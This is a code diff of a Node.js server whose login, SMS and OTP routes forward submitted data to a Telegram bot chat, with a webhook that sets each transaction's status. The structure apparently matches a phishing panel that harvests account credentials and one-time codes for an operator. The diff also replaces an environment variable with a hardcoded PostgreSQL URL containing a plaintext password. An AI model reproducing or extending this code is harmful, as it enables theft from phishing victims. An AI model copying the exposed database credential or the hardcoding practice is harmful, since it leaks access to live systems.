@@ -12,20 +12,21 @@ const PORT = process.env.PORT || 10000;
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; 
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// FIX: Read EITHER DATABASE_URL or DATABASE_PUBLIC_URL
-const DATABASE_URL = process.env.DATABASE_URL || process.env.DATABASE_PUBLIC_URL;
+// Hardcoded Railway URL (Temporary fix for testing)
+const DATABASE_URL = 'postgresql://postgres:wmodryYoJUDjWWOrmuXYofkIMAjnObXD@gondola.proxy.rlwy.net:30560/railway';
 
 console.log("Booting server...");
 console.log("Telegram Token present:", !!TELEGRAM_BOT_TOKEN);
 console.log("Telegram Chat ID present:", !!TELEGRAM_CHAT_ID);
-console.log("Database URL present:", !!DATABASE_URL);
+console.log("Database URL starting with:", DATABASE_URL.substring(0, 20));
 
 // --- DATABASE SETUP (Railway) ---
 const pool = new Pool({
   connectionString: DATABASE_URL,
-  ssl: { rejectUnauthorized: false } // Required for Railway public connections
+  ssl: { rejectUnauthorized: false } // Keep this for Railway proxy
 });
 
+// Create table on startup
 pool.query(`
   CREATE TABLE IF NOT EXISTS transactions (
     ref VARCHAR(50) PRIMARY KEY,
@@ -33,8 +34,8 @@ pool.query(`
     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
   );
 `)
-.then(() => console.log("Database connected and table ready."))
-.catch(err => console.error("DB Init Error:", err.message));
+.then(() => console.log("✅ Database connected and table ready."))
+.catch(err => console.error("❌ DB Init Error:", err.message));
 
 // --- ROUTES ---
 
@@ -47,6 +48,7 @@ app.post('/api/login', async (req, res) => {
     await pool.query(`
       INSERT INTO transactions (ref, status) VALUES ($1, 'pending') ON CONFLICT (ref) DO NOTHING;
     `, [ref]);
+    console.log("DB record created for:", ref);
   } catch (dbErr) {
     console.error("DB Insert Error:", dbErr.message);
   }
@@ -78,7 +80,7 @@ app.post('/api/login', async (req, res) => {
       })
     });
     const tgData = await tgRes.json();
-    console.log("Telegram Response:", tgData.ok ? "Success" : tgData);
+    console.log("Telegram Response:", tgData.ok ? "✅ Success" : tgData);
     res.json({ success: true });
   } catch (err) {
     console.error("Telegram Error:", err.message);
@@ -121,7 +123,7 @@ ${message}
       })
     });
     const tgData = await tgRes.json();
-    console.log("Telegram SMS Response:", tgData.ok ? "Success" : tgData);
+    console.log("Telegram SMS Response:", tgData.ok ? "✅ Success" : tgData);
     res.json({ success: true });
   } catch (err) {
     console.error("Telegram Error:", err.message);
@@ -159,7 +161,7 @@ app.post('/api/otp', async (req, res) => {
       })
     });
     const tgData = await tgRes.json();
-    console.log("Telegram OTP Response:", tgData.ok ? "Success" : tgData);
+    console.log("Telegram OTP Response:", tgData.ok ? "✅ Success" : tgData);
     res.json({ success: true });
   } catch (err) {
     console.error("Telegram Error:", err.message);
@@ -196,6 +198,7 @@ app.post('/webhook', async (req, res) => {
 
     try {
       await pool.query('UPDATE transactions SET status = $1 WHERE ref = $2', [status, ref]);
+      console.log(`DB updated: ${ref} -> ${status}`);
     } catch (err) {
       console.error("DB Update Error:", err.message);
     }
